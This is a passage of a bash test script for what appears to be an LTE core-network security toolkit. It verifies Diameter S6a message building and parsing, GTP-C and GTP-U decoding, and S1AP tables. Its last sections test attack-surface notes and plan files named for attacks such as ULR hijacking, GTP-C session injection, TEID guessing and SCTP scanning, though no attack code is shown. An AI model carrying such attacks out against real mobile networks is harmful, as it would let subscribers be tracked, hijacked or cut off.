    # Origin-Host (264) "mme" : 00000108 40 00000C 6D6D652E... build it.
    local oh; oh=$(lcore_diameter_build_utf8_avp 264 "mme" M)
    chk avp-oh-code "$(printf '%s' "$oh" | cut -c1-8)" "00000108"
    chk avp-oh-flags "$(printf '%s' "$oh" | cut -c9-10)" "40"
    # "mme" = 3 octets, header 8, length = 11, padded to 12.
    chk avp-oh-len  "$(printf '%s' "$oh" | cut -c11-16)" "00000B"
    chk avp-oh-total "$(printf '%s' "$oh" | wc -c)" "24"
    chk avp-oh-pad  "$(printf '%s' "$oh" | cut -c23-24)" "00"

    out=$(lcore_diameter_parse_avps "$oh")
    chk avp-oh-p-code "$(fld "$out" avp.0.code)" "264"
    chk avp-oh-p-name "$(fld "$out" avp.0.name)" "Origin-Host"
    chk avp-oh-p-M    "$(fld "$out" avp.0.M)" "1"
    chk avp-oh-p-V    "$(fld "$out" avp.0.V)" "0"
    chk avp-oh-p-len  "$(fld "$out" avp.0.length)" "11"
    chk avp-oh-p-data "$(fld "$out" avp.0.data)" "6D6D65"
    chk avp-oh-p-text "$(fld "$out" avp.0.decoded)" "Origin-Host=mme"
    chk avp-oh-count  "$(fld "$out" avp_count)" "1"

    # Two AVPs in sequence must both be walked.
    local u32; u32=$(lcore_diameter_build_u32_avp 1410 5 M)
    out=$(lcore_diameter_parse_avps "${oh}${u32}")
    chk avp-two-count "$(fld "$out" avp_count)" "2"
    chk avp-two-1code "$(fld "$out" avp.1.code)" "1410"
    chk avp-two-1dec  "$(fld "$out" avp.1.decoded)" "Number-Of-Requested-Vectors=5"

    # A vendor-specific AVP carries a 4-octet Vendor-Id and a 12-octet header.
    local vs; vs=$(lcore_diameter_build_u32_avp 1410 3 V 10415)
    out=$(lcore_diameter_parse_avps "$vs")
    chk avp-vs-V     "$(fld "$out" avp.0.V)" "1"
    chk avp-vs-vid   "$(fld "$out" avp.0.vendor_id)" "10415"
    chk avp-vs-len   "$(fld "$out" avp.0.length)" "16"
    chk avp-vs-data  "$(fld "$out" avp.0.data)" "00000003"

    # A GROUPED AVP: Requested-EUTRAN-Authentication-Info (1408) holding
    # Number-Of-Requested-Vectors (1410) and Immediate-Response-Preferred (1413).
    local g_in; g_in="$(lcore_diameter_build_u32_avp 1410 2 M)$(lcore_diameter_build_u32_avp 1412 0 M)"
    local grouped; grouped=$(lcore_diameter_build_avp 1408 "$g_in" M)
    out=$(lcore_diameter_parse_avps "$grouped")
    chk avp-group-code "$(fld "$out" avp.0.code)" "1408"
    chk avp-group-len  "$(fld "$out" avp.0.length)" "32"
    chk avp-group-dlen "$(fld "$out" avp.0.data_octets)" "24"
    chk avp-group-note "$(printf '%s\n' "$out" | grep -c 'grouped')" "1"
    # Walk the inner AVPs of the grouped value: the walk must find both.
    local inner; inner=$(fld "$out" avp.0.data)
    out=$(lcore_diameter_parse_avps "$inner")
    chk avp-inner-count "$(fld "$out" avp_count)" "2"
    chk avp-inner-0code "$(fld "$out" avp.0.code)" "1410"
    chk avp-inner-0dec  "$(fld "$out" avp.0.decoded)" "Number-Of-Requested-Vectors=2"
    chk avp-inner-1code "$(fld "$out" avp.1.code)" "1412"
    chk avp-inner-1dec  "$(fld "$out" avp.1.decoded)" "Immediate-Response-Preferred=0"

    # A declared AVP length longer than the bytes present is rejected.
    chk avp-truncated "$(lcore_diameter_parse_avps 00000108400000FF >/dev/null 2>&1; echo $?)" "1"
    # A fragment shorter than a header after the last AVP is not padding.
    chk avp-leftover "$(lcore_diameter_parse_avps 000001084000000C00000001FFFF >/dev/null 2>&1; echo $?)" "1"
    # The verb must fail when the walk does: a GUI button reads the exit code.
    chk dcd-walk-rc "$(lcore_cmd_decode_diameter 01000028C000013C010000530000000100000001000001084000000C00000001FFFF >/dev/null 2>&1; echo $?)" "1"
    chk gcd-walk-rc "$(lcore_cmd_decode_gtp_c 482000240000000100000001000000011F00 >/dev/null 2>&1; echo $?)" "1"
    # These two are padded literals: 5200010006 plus three pad octets.
    chk gcd-walk-ok "$(lcore_cmd_decode_gtp_c 482000140000000100000001000000015200010006 >/dev/null 2>&1; echo $?)" "0"
    # A zero-length AVP is below the 8-octet minimum and is rejected.
    chk avp-zero-len  "$(lcore_diameter_parse_avps 0000010840000000 >/dev/null 2>&1; echo $?)" "1"
    # A well-formed but value-less AVP parses.
    chk avp-min-len   "$(lcore_diameter_parse_avps 0000010840000008 >/dev/null 2>&1; echo $?)" "0"

    # ── 3. Command-code classification ──────────────────────────────────
    chk cc-316 "$(lcore_diameter_command_name 316)" "Update-Location (ULR/ULA)  [S6a/S6d]"
    chk cc-317 "$(lcore_diameter_command_name 317)" "Cancel-Location (CLR/CLA)  [S6a/S6d]"
    chk cc-318 "$(lcore_diameter_command_name 318)" "Authentication-Information (AIR/AIA)  [S6a/S6d]"
    chk cc-319 "$(lcore_diameter_command_name 319)" "Insert-Subscriber-Data (IDR/IDA)  [S6a/S6d]"
    chk cc-320 "$(lcore_diameter_command_name 320)" "Delete-Subscriber-Data (DSR/DSA)  [S6a/S6d]"
    chk cc-321 "$(lcore_diameter_command_name 321)" "Purge-UE (PUR/PUA)  [S6a/S6d]"
    chk cc-322 "$(lcore_diameter_command_name 322)" "Reset (RSR/RSA)  [S6a/S6d]"
    chk cc-323 "$(lcore_diameter_command_name 323)" "Notify (NOR/NOA)  [S6a/S6d]"
    chk cc-9999 "$(lcore_diameter_command_name 9999)" "unassigned/unknown"
    # Request vs answer classification.
    # Direction is the R bit, and one code yields both directions.
    chk ccr-req-80 "$(lcore_diameter_flags_is_request 80 && echo req || echo ans)" "req"
    chk ccr-req-c0 "$(lcore_diameter_flags_is_request c0 && echo req || echo ans)" "req"
    chk ccr-ans-00 "$(lcore_diameter_flags_is_request 00 && echo req || echo ans)" "ans"
    chk ccr-ans-40 "$(lcore_diameter_flags_is_request 40 && echo req || echo ans)" "ans"
    chk ccr-bad    "$(lcore_diameter_flags_is_request zz >/dev/null 2>&1; echo $?)" "1"
    chk ccr-empty  "$(lcore_diameter_flags_is_request '' >/dev/null 2>&1; echo $?)" "1"
    chk cc-shared  "$(lcore_diameter_command_name 316 | grep -c 'ULR/ULA')" "1"
    chk app-s6a "$(lcore_diameter_app_name 16777251)" "3GPP S6a/S6d"
    chk app-wx  "$(lcore_diameter_app_name 16777219)" "3GPP Wx"
    chk app-gx  "$(lcore_diameter_app_name 16777238)" "3GPP Gx (29.212)"
    chk app-s13 "$(lcore_diameter_app_name 16777252)" "3GPP S13/S13'"
    chk app-unk "$(lcore_diameter_app_name 424242)"  "unknown"
    chk rc-2001 "$(lcore_diameter_result_code 2001)" "DIAMETER_SUCCESS (2001)"
    # RFC 6733 renamed several of the RFC 3588 codes: 3007 is now
    # APPLICATION_UNSUPPORTED and NO_COMMON_SECURITY moved from 3010 to 5017.
    chk rc-3007 "$(lcore_diameter_result_code 3007)" "DIAMETER_APPLICATION_UNSUPPORTED (3007)"
    chk rc-3010 "$(lcore_diameter_result_code 3010)" "DIAMETER_UNKNOWN_PEER (3010)"
    chk rc-5001 "$(lcore_diameter_result_code 5001)" "DIAMETER_AVP_UNSUPPORTED (5001)"
    chk rc-5420 "$(lcore_diameter_result_code 5420)" "unassigned Diameter result code (5420)"
    # The 3GPP codes live in Experimental-Result-Code (§7.4), AVP 298.
    chk erc-5001 "$(lcore_diameter_exp_result_code 5001)" "DIAMETER_ERROR_USER_UNKNOWN (5001)"
    chk erc-5420 "$(lcore_diameter_exp_result_code 5420)" "DIAMETER_ERROR_UNKNOWN_EPS_SUBSCRIPTION (5420)"

    # ── 4. AVP code registry (the codes the brief names) ────────────────
    chk avpn-263  "$(lcore_diameter_avp_name 263)"  "Session-Id"
    chk avpn-264  "$(lcore_diameter_avp_name 264)"  "Origin-Host"
    chk avpn-1    "$(lcore_diameter_avp_name 1)"    "User-Name"
    chk avpn-277  "$(lcore_diameter_avp_name 277)"  "Auth-Session-State"
    chk avpn-1407 "$(lcore_diameter_avp_name 1407)" "Visited-PLMN-Id"
    chk avpn-1408 "$(lcore_diameter_avp_name 1408)" "Requested-EUTRAN-Authentication-Info"
    chk avpn-1410 "$(lcore_diameter_avp_name 1410)" "Number-Of-Requested-Vectors"
    chk avpn-1405 "$(lcore_diameter_avp_name 1405)" "ULR-Flags"
    chk avpn-1412 "$(lcore_diameter_avp_name 1412)" "Immediate-Response-Preferred"
    chk avpn-1417 "$(lcore_diameter_avp_name 1417)" "Network-Access-Mode"
    chk avpn-1447 "$(lcore_diameter_avp_name 1447)" "RAND"
    chk avpn-1448 "$(lcore_diameter_avp_name 1448)" "XRES"
    chk avpn-1449 "$(lcore_diameter_avp_name 1449)" "AUTN"
    chk avpn-1450 "$(lcore_diameter_avp_name 1450)" "KASME"
    chk avpn-1032 "$(lcore_diameter_avp_name 1032)" "RAT-Type"
    # Origin-Realm is 296; 285 is Re-Auth-Request-Type and 297/298 are the
    # Experimental-Result pair.
    chk avpn-285  "$(lcore_diameter_avp_name 285)"  "Re-Auth-Request-Type"
    chk avpn-296  "$(lcore_diameter_avp_name 296)"  "Origin-Realm"
    chk avpn-297  "$(lcore_diameter_avp_name 297)"  "Experimental-Result"
    chk avpn-298  "$(lcore_diameter_avp_name 298)"  "Experimental-Result-Code"

    # ── 5. Built AIR/ULR round-trip ─────────────────────────────────────
    out=$(lcore_cmd_build_air 310150123456789); rc=$?
    chk air-rc      "$rc" "0"
    chk air-cmd     "$(fld "$out" roundtrip_command)" "318"
    chk air-app     "$(fld "$out" roundtrip_app)" "16777251"
    chk air-R       "$(fld "$out" roundtrip_R)" "1"
    chk air-lenok   "$(fld "$out" roundtrip_length_ok)" "yes"
    local airhex; airhex=$(fld "$out" hex)
    chk air-version "$(printf '%s' "$airhex" | cut -c1-2)" "01"
    # Walk the AVPs of the built message and confirm the required ones.
    out=$(lcore_cmd_decode_diameter "$airhex")
    chk air-has-session  "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.name$/ && $2=="Session-Id"{print "yes"; exit}')" "yes"
    chk air-uname        "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="User-Name=310150123456789"{print "yes"; exit}')" "yes"
    chk air-plmn         "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Visited-PLMN-Id=208-01"{print "yes"; exit}')" "yes"
    # Number-Of-Requested-Vectors lives INSIDE the grouped
    # Requested-EUTRAN-Authentication-Info AVP, so walk the group rather
    # than looking for it at the top level.
    chk air-grouped      "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.name$/ && $2=="Requested-EUTRAN-Authentication-Info"{print "yes"; exit}')" "yes"
    local gidx gdata
    gidx=$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.code$/ && $2=="1408"{sub(/\.code$/,"",$1); print $1; exit}')
    chk air-grouped-idx-nonempty "$([[ -n "$gidx" ]] && echo yes || echo no)" "yes"
    gdata=$(printf '%s\n' "$out" | awk -F'\t' -v k="${gidx}.data" '$1==k{print $2; exit}')
    local gout; gout=$(lcore_diameter_parse_avps "$gdata")
    chk air-nvectors     "$(printf '%s\n' "$gout" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Number-Of-Requested-Vectors=1"{print "yes"; exit}')" "yes"
    chk air-irp          "$(printf '%s\n' "$gout" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Immediate-Response-Preferred=0"{print "yes"; exit}')" "yes"
    chk air-group-inner-count "$(printf '%s\n' "$gout" | awk -F'\t' '$1=="avp_count"{print $2; exit}')" "2"
    chk air-flags        "$(fld "$out" flags)" "C0"

    out=$(lcore_cmd_build_ulr 310150123456789); rc=$?
    chk ulr-rc    "$rc" "0"
    chk ulr-cmd   "$(fld "$out" roundtrip_command)" "316"
    chk ulr-lenok "$(fld "$out" roundtrip_length_ok)" "yes"
    out=$(lcore_cmd_decode_diameter "$(fld "$out" hex)")
    chk ulr-name  "$(fld "$out" command_name)" "Update-Location (ULR/ULA)  [S6a/S6d]"
    chk ulr-rat   "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="RAT-Type=6"{print "yes"; exit}')" "yes"

    # Builders validate their input.
    chk air-bad-imsi "$(lcore_cmd_build_air 123 >/dev/null 2>&1; echo $?)" "1"
    chk ulr-bad-imsi "$(lcore_cmd_build_ulr abc >/dev/null 2>&1; echo $?)" "1"
    chk air-bad-nv   "$(lcore_build_air 310150123456789 mme.localdomain localdomain 9 >/dev/null 2>&1; echo $?)" "2"
    out=$(lcore_cmd_build_clr 310150123456789); rc=$?
    chk clr-build-rc  "$rc" "0"
    chk clr-build-cmd "$(fld "$out" roundtrip_command)" "317"
    chk clr-build-app "$(fld "$out" roundtrip_app)" "16777251"
    chk clr-build-len "$(fld "$out" roundtrip_length_ok)" "yes"
    # Cancellation-Type is AVP 1420 (§7.3.24); 1421 is DSR-Flags.
    out=$(lcore_cmd_decode_diameter "$(fld "$out" hex)")
    chk clr-ct-code "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.code$/ && $2=="1420"{print "yes"; exit}')" "yes"
    chk clr-ct-dec  "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^avp\.[0-9]+\.decoded$/ && $2=="Cancellation-Type=0"{print "yes"; exit}')" "yes"

    local clr; clr=$(lcore_build_clr 310150123456789 hss.localdomain localdomain 0)
    out=$(lcore_diameter_parse_header "$clr")
    chk clr-cmd  "$(fld "$out" command_code)" "317"
    chk clr-name "$(fld "$out" command_name)" "Cancel-Location (CLR/CLA)  [S6a/S6d]"

    # ── 6. GTP-C header parse with TEID and sequence ────────────────────
    # Hand-built Create Session Request:
    #   48        flags: version 2, T=1
    #   20        message type 32 (Create Session Request)
    #   0008      length 8
    #   00000001  TEID 1
    #   000001    sequence 1
    #   00        spare
    local gtp="482000080000000100000100"
    out=$(lcore_gtpc_parse_header "$gtp"); rc=$?
    chk gtp-rc      "$rc" "0"
    chk gtp-version "$(fld "$out" version)" "2"
    chk gtp-proto   "$(fld "$out" protocol)" "GTPv2-C"
    chk gtp-T       "$(fld "$out" flag_T)" "1"
    chk gtp-mtype   "$(fld "$out" message_type)" "32"
    chk gtp-mname   "$(fld "$out" message_name)" "Create Session Request"
    chk gtp-len     "$(fld "$out" length)" "8"
    chk gtp-teid    "$(fld "$out" teid)" "1"
    chk gtp-teidhex "$(fld "$out" teid_hex)" "00000001"
    chk gtp-seq     "$(fld "$out" sequence_number)" "1"
    chk gtp-spare   "$(fld "$out" spare)" "00"
    chk gtp-payload-octets "$(fld "$out" payload_octets)" "0"

    # Echo Request (type 1) with no TEID: flags 0x40, no T bit.
    local echo="4001000400000100"
    out=$(lcore_gtpc_parse_header "$echo")
    chk echo-mtype "$(fld "$out" message_type)" "1"
    chk echo-name  "$(fld "$out" message_name)" "Echo Request"
    chk echo-teid  "$(fld "$out" teid)" "none"
    chk echo-seq   "$(fld "$out" sequence_number)" "1"

    # Echo Response (type 2).
    out=$(lcore_gtpc_parse_header "4002000400000100")
    chk echoresp-name "$(fld "$out" message_name)" "Echo Response"

    # A large TEID and sequence must survive the 32-bit / 24-bit reads.
    out=$(lcore_gtpc_parse_header "48200008DEADBEEFFFFFFF00")
    chk gtp-bigteid "$(fld "$out" teid)" "3735928559"
    chk gtp-bigseq  "$(fld "$out" sequence_number)" "16777215"

    chk gtp-short  "$(lcore_gtpc_parse_header 48 >/dev/null 2>&1; echo $?)" "1"
    chk gtp-nonhex "$(lcore_gtpc_parse_header zz >/dev/null 2>&1; echo $?)" "1"
    chk gtp-missing "$(lcore_cmd_decode_gtp_c >/dev/null 2>&1; echo $?)" "2"
    chk gtpu-missing "$(lcore_cmd_decode_gtp_u >/dev/null 2>&1; echo $?)" "2"

    # ── 7. GTP-C IE format and types ────────────────────────────────────
    # IMSI IE (type 1): type 01, length 0008, instance 00, then 8 TBCD
    # octets for the 15-digit 310150123456789. §8.3 has NO digit-count
    # octet: the digits are 13 10 05 21 43 65 87 F9, and the odd count ends
    # in the filler 1111 in the high nibble of the last octet.
    local imsi_ie="0100080013100521436587F9"
    out=$(lcore_gtpc_parse_ies "$imsi_ie"); rc=$?
    chk gtpie-rc     "$rc" "0"
    chk gtpie-type   "$(fld "$out" ie.0.type)" "1"
    chk gtpie-name   "$(fld "$out" ie.0.name)" "International Mobile Subscriber Identity (IMSI)"
    chk gtpie-len    "$(fld "$out" ie.0.length)" "8"
    chk gtpie-spare  "$(fld "$out" ie.0.spare)" "0"
    chk gtpie-inst   "$(fld "$out" ie.0.instance)" "0"
    chk gtpie-dec    "$(fld "$out" ie.0.decoded)" "IMSI=310150123456789"
    chk gtpie-count  "$(fld "$out" ie_count)" "1"

    # Cause IE (type 2), value 16 (Request accepted).
    out=$(lcore_gtpc_parse_ies "0200010010000000")
    chk gtpie-cause "$(fld "$out" ie.0.decoded)" "Cause=16"
    chk gtpie-cname "$(fld "$out" ie.0.name)" "Cause"

    # Recovery IE (type 3) is one octet (§8.5). It used to be read as a
    # MSISDN, which is type 76.
    out=$(lcore_gtpc_parse_ies "0300010010")
    chk gtpie-recovery "$(fld "$out" ie.0.name)" "Recovery (Restart Counter)"
    chk gtpie-recovery-val "$(fld "$out" ie.0.decoded)" "Recovery=16"

    # APN IE (71) "internet" = 08 69 6E 74 65 72 6E 65 74
    local apn_ie="4700090008696E7465726E6574"
    out=$(lcore_gtpc_parse_ies "$apn_ie")
    chk gtpie-apn-type "$(fld "$out" ie.0.type)" "71"
    chk gtpie-apn-name "$(fld "$out" ie.0.name)" "Access Point Name (APN)"
    chk gtpie-apn-dec  "$(fld "$out" ie.0.decoded)" "APN=internet"

    # MSISDN IE (76) with a 10-digit number: §8.11 is TBCD too, no count.
    out=$(lcore_gtpc_parse_ies "4C0005001032547698")
    chk gtpie-msisdn "$(fld "$out" ie.0.name)" "MSISDN"
    chk gtpie-msisdn-val "$(fld "$out" ie.0.decoded)" "MSISDN=0123456789"

    # RAT Type IE (82) = 06, EUTRAN (§8.17).
    out=$(lcore_gtpc_parse_ies "5200010006")
    chk gtpie-rat "$(fld "$out" ie.0.decoded)" "RAT=EUTRAN (WB-E-UTRAN)"

    # Serving Network IE (83) for 310/260 (§8.18), the PLMN order that TAI
    # and ECGI use. It is 83, not 111 — 111 is the P-TMSI.
    out=$(lcore_gtpc_parse_ies "5300030013006200")
    chk gtpie-sn "$(fld "$out" ie.0.name)" "Serving Network"
    chk gtpie-sn-val "$(fld "$out" ie.0.decoded)" "ServingNetwork=310-260"

    # P-TMSI IE (111), 4 octets (§8.41).
    out=$(lcore_gtpc_parse_ies "6F000400DEADBEEF")
    chk gtpie-ptmsi "$(fld "$out" ie.0.name)" "P-TMSI"
    chk gtpie-ptmsi-val "$(fld "$out" ie.0.decoded)" "P-TMSI=DEADBEEF"

    # F-TEID IE (87): V4 flag, interface type 10 (S11 MME GTP-C), TEID 42,
    # address 10.0.0.1 (§8.22).
    out=$(lcore_gtpc_parse_ies "570009008A0000002A0A000001")
    chk gtpie-fteid "$(fld "$out" ie.0.decoded)" "F-TEID=interface=S11 MME GTP-C (10) teid=42 ipv4=10.0.0.1"

    # ULI IE (86) carrying an ECGI (§8.21).
    out=$(lcore_gtpc_parse_ies "560008001002F8100000ABCD")
    chk gtpie-uli "$(fld "$out" ie.0.decoded)" "ULI=ECGI 208-01 eci=43981; "

    # IE type registry (the numbers the brief names).
    chk ien-1  "$(lcore_gtpc_ie_name 1)"  "International Mobile Subscriber Identity (IMSI)"
    chk ien-2  "$(lcore_gtpc_ie_name 2)"  "Cause"
    chk ien-3  "$(lcore_gtpc_ie_name 3)"  "Recovery (Restart Counter)"
    chk ien-4  "$(lcore_gtpc_ie_name 4)"  "Reserved for the S101 interface (TS 29.276)"
    chk ien-71 "$(lcore_gtpc_ie_name 71)" "Access Point Name (APN)"
    chk ien-83 "$(lcore_gtpc_ie_name 83)" "Serving Network"
    chk ien-86 "$(lcore_gtpc_ie_name 86)" "User Location Information (ULI)"
    chk ien-87 "$(lcore_gtpc_ie_name 87)" "Fully Qualified Tunnel Endpoint Identifier (F-TEID)"
    chk ien-93 "$(lcore_gtpc_ie_name 93)" "Bearer Context"
    chk ien-111 "$(lcore_gtpc_ie_name 111)" "P-TMSI"
    chk ien-114 "$(lcore_gtpc_ie_name 114)" "UE Time Zone"
    chk ien-254 "$(lcore_gtpc_ie_name 254)" "Special IE type for IE Type Extension"
    chk ien-255 "$(lcore_gtpc_ie_name 255)" "Private Extension"
    chk ien-207 "$(lcore_gtpc_ie_name 207)" "Spare, for future use"
    chk ien-unknown "$(lcore_gtpc_ie_name 60000)" "unknown/extension IE type"

    # Message types as the card's peers send them (Table 6.1-1). The
    # Identifying/Context messages at 128-132 are the Mobility Management
    # ones, and the access-bearer messages are 170/171, not 162/163.
    chk mtn-32  "$(lcore_gtpc_msg_name 32)"  "Create Session Request"
    chk mtn-128 "$(lcore_gtpc_msg_name 128)" "Identification Request"
    chk mtn-130 "$(lcore_gtpc_msg_name 130)" "Context Request"
    chk mtn-162 "$(lcore_gtpc_msg_name 162)" "Suspend Notification"
    chk mtn-170 "$(lcore_gtpc_msg_name 170)" "Release Access Bearers Request"
    chk mtn-176 "$(lcore_gtpc_msg_name 176)" "Downlink Data Notification"
    chk mtn-178 "$(lcore_gtpc_msg_name 178)" "Reserved (allocated in an earlier version of TS 29.274)"
    chk mtn-254 "$(lcore_gtpc_msg_name 254)" "For future use"

    # TAI and ECGI as they appear INSIDE the ULI IE (114), not as IE 86/87.
    # TAI = PLMN 02F810 (plain BCD) + TAC 0x1234.
    chk tai-dec "$(lcore_tai_decode 02F8101234)" "208-01 tac=4660"
    # ECGI = PLMN + ECI 0x0000ABCD = 43981.
    chk ecgi-dec "$(lcore_ecgi_decode 02F8100000ABCD)" "208-01 eci=43981"
    # ULI with the ECGI flag (0x10) set.
    out=$(lcore_uli_decode "1002F8100000ABCD")
    chk uli-flags   "$(fld "$out" uli.flags)" "16"
    chk uli-ecgi    "$(fld "$out" uli.ecgi)" "208-01 eci=43981"
    chk uli-present "$(fld "$out" uli.present)" "ECGI "
    # ULI with the TAI flag (0x08) set.
    out=$(lcore_uli_decode "0802F8101234")
    chk uli-tai "$(fld "$out" uli.tai)" "208-01 tac=4660"
    # ULI with both TAI and ECGI.
    out=$(lcore_uli_decode "1802F810123402F8100000ABCD")
    chk uli-both-present "$(fld "$out" uli.present)" "TAI ECGI "
    chk uli-both-tai     "$(fld "$out" uli.tai)" "208-01 tac=4660"
    chk uli-both-ecgi    "$(fld "$out" uli.ecgi)" "208-01 eci=43981"

    # An IE that overruns the buffer must be an error, not a silent truncation.
    chk gtpie-overrun "$(lcore_gtpc_parse_ies 0100FF0001 >/dev/null 2>&1; echo $?)" "1"

    # Two IEs in sequence. The literal below is a PADDED message on purpose:
    # pad mode exists only to read captures produced by older versions of this
    # tree, and this is the test that keeps that mode working. The unpadded
    # form is the default and is exercised by everything else.
    # IE1: type 02 len 0002 inst 00 value 0010 (4 octets total, aligned).
    # IE2: type 01 len 0009 inst 00 value <9 octets> -> total 13, pad 3.
    out=$(lcore_gtpc_parse_ies "0200010010000000${imsi_ie}" pad)
    chk gtpie-two-count "$(fld "$out" ie_count)" "2"
    chk gtpie-two-0     "$(fld "$out" ie.0.type)" "2"
    chk gtpie-two-1     "$(fld "$out" ie.1.type)" "1"
    chk gtpie-two-1dec  "$(fld "$out" ie.1.decoded)" "IMSI=310150123456789"

    # ── 8. GTP-U header and extension-header walk ───────────────────────
    # G-PDU: flags 0x30 (version 1, PT 1), type 0xFF, length 4, TEID 1,
    # then 4 octets of payload. No optional fields.
    out=$(lcore_gtpu_parse_header "30FF000400000001DEADBEEF"); rc=$?
    chk gtpu-rc      "$rc" "0"
    chk gtpu-version "$(fld "$out" version)" "1"
    chk gtpu-proto   "$(fld "$out" protocol)" "GTPv1-U"
    chk gtpu-PT      "$(fld "$out" flag_PT)" "1"
    chk gtpu-E       "$(fld "$out" flag_E)" "0"
    chk gtpu-S       "$(fld "$out" flag_S)" "0"
    chk gtpu-mtype   "$(fld "$out" message_type)" "0xFF"
    chk gtpu-mname   "$(fld "$out" message_name)" "G-PDU (T-PDU)"
    chk gtpu-teid    "$(fld "$out" teid)" "1"
    chk gtpu-payload "$(fld "$out" payload)" "DEADBEEF"
    chk gtpu-extcount "$(fld "$out" ext_count)" "0"

    # Echo Request (type 1) with sequence number, no extension header.
    out=$(lcore_gtpu_parse_header "3201000400000001000100")
    chk gtpu-echo-mtype "$(fld "$out" message_type)" "0x01"
    chk gtpu-echo-name  "$(fld "$out" message_name)" "Echo Request"

    # A G-PDU with an extension header chain:
    #   flags 0x34 = version 1, PT 1, E 1
    #   type FF, length 0008, TEID 00000001
    #   seq 0001, npdu 00, next-type 0x40 (UDP Port)
    #   ext: units 01, content 0000, next 0x00  -> ends the chain
    # flags 0x37 = version 1, PT 1, E 1, S 1, PN 1, so all four trailer
    # fields are present.
    local with_ext="37FF000C000000010001004001000000"
    out=$(lcore_gtpu_parse_header "$with_ext"); rc=$?
    chk gtpu-ext-rc    "$rc" "0"
    chk gtpu-ext-E     "$(fld "$out" flag_E)" "1"
    chk gtpu-ext-S     "$(fld "$out" flag_S)" "1"
    chk gtpu-ext-seq   "$(fld "$out" sequence_number)" "1"
    chk gtpu-ext-npdu  "$(fld "$out" npdu_number)" "0"
    chk gtpu-ext-next  "$(fld "$out" next_extension_header_type)" "0x40"
    chk gtpu-ext-nextn "$(fld "$out" next_extension_header_name)" "UDP Port"
    chk gtpu-ext-count "$(fld "$out" ext_count)" "1"
    chk gtpu-ext0-type "$(fld "$out" ext.0.type)" "0x40"
    chk gtpu-ext0-name "$(fld "$out" ext.0.name)" "UDP Port"
    chk gtpu-ext0-units "$(fld "$out" ext.0.units)" "1"
    chk gtpu-ext0-oct  "$(fld "$out" ext.0.octets)" "4"

    # Extension header type registry.
    chk ext-00  "$(lcore_gtpu_ext_name 0)"    "No more extension headers"
    chk ext-01  "$(lcore_gtpu_ext_name 1)"    "Reserved - Control Plane only"
    chk ext-03  "$(lcore_gtpu_ext_name 3)"    "Long PDCP PDU Number"
    chk ext-82  "$(lcore_gtpu_ext_name 130)"  "Long PDCP PDU Number (earlier release; not sent by a source complying with this release)"
    chk ext-85  "$(lcore_gtpu_ext_name 133)"  "PDU Session Container"
    chk ext-comp0 "$(lcore_gtpu_ext_comprehension 0)" "not required: an intermediate node forwards it"
    chk ext-comp3 "$(lcore_gtpu_ext_comprehension 3)" "required by every recipient"
    chk ext-03  "$(lcore_gtpu_ext_name 3)"    "Long PDCP PDU Number"
    chk ext-20  "$(lcore_gtpu_ext_name 32)"   "Service Class Indicator"
    chk ext-40  "$(lcore_gtpu_ext_name 64)"   "UDP Port"
    chk ext-85  "$(lcore_gtpu_ext_name 133)"  "PDU Session Container"
    chk ext-c0  "$(lcore_gtpu_ext_name 192)"  "PDCP PDU Number"
    chk ext-c1  "$(lcore_gtpu_ext_name 193)"  "Reserved - Control Plane only"
    chk ext-unk "$(lcore_gtpu_ext_name 200)"  "unknown extension header"
    chk gtpu-mname-2 "$(lcore_gtpu_msg_name 2)"   "Echo Response"
    chk gtpu-mname-26 "$(lcore_gtpu_msg_name 26)" "Error Indication"

    chk gtpu-short  "$(lcore_gtpu_parse_header 30FF >/dev/null 2>&1; echo $?)" "1"
    chk gtpu-nonhex "$(lcore_gtpu_parse_header zz >/dev/null 2>&1; echo $?)" "1"

    # ── 9. S1AP tables ──────────────────────────────────────────────────
    out=$(lcore_s1ap_procedures)
    chk s1ap-proc-count "$(printf '%s\n' "$out" | grep -c .)" "45"
    chk s1ap-initial   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="InitialUEMessage"{print $2}')" "12"
    chk s1ap-uplink    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="UplinkNASTransport"{print $2}')" "13"
    chk s1ap-downlink  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="DownlinkNASTransport"{print $2}')" "11"
    chk s1ap-paging    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="Paging"{print $2}')" "10"
    out=$(lcore_s1ap_identity_procedures)
    chk s1ap-id-count "$(printf '%s\n' "$out" | grep -c .)" "6"
    chk s1ap-id-12    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="InitialUEMessage"{print $2}')" "12"

    # ── 10. Attack-surface notes ────────────────────────────────────────
    out=$(lcore_surface_notes)
    chk surf-count   "$(printf '%s\n' "$out" | grep -c .)" "6"
    chk surf-diam    "$(printf '%s\n' "$out" | grep -c 'unprotected-diameter-peer')" "1"
    chk surf-ulr     "$(printf '%s\n' "$out" | grep -c 'spoofed-ulr')" "1"
    chk surf-gtpc    "$(printf '%s\n' "$out" | grep -c 'gtpc-create-session-injection')" "1"
    chk surf-sctp    "$(printf '%s\n' "$out" | grep -c 'sctp-multihoming')" "1"
    chk surf-gtpu    "$(printf '%s\n' "$out" | grep -c 'gtpu-teid-guessing')" "1"

    # ── 11. Plan files carry status: handoff ────────────────────────────
    local plan
    for plan in ulr-hijack gtp-inject sctp-scan; do
        local pout pf; pout=$(lcore_cmd_plan "$plan"); rc=$?
        chk "plan-$plan-rc" "$rc" "0"
        # The verb reports handoff and the path, so extract the path.
        chk "plan-$plan-verb-status" "$(fld "$pout" status)" "handoff"
        pf=$(fld "$pout" plan_file)
        [[ -f "$pf" ]] || { chk "plan-$plan-file" "missing" "present"; continue; }
        chk "plan-$plan-status" "$(grep -c '^status: handoff$' "$pf")" "1"
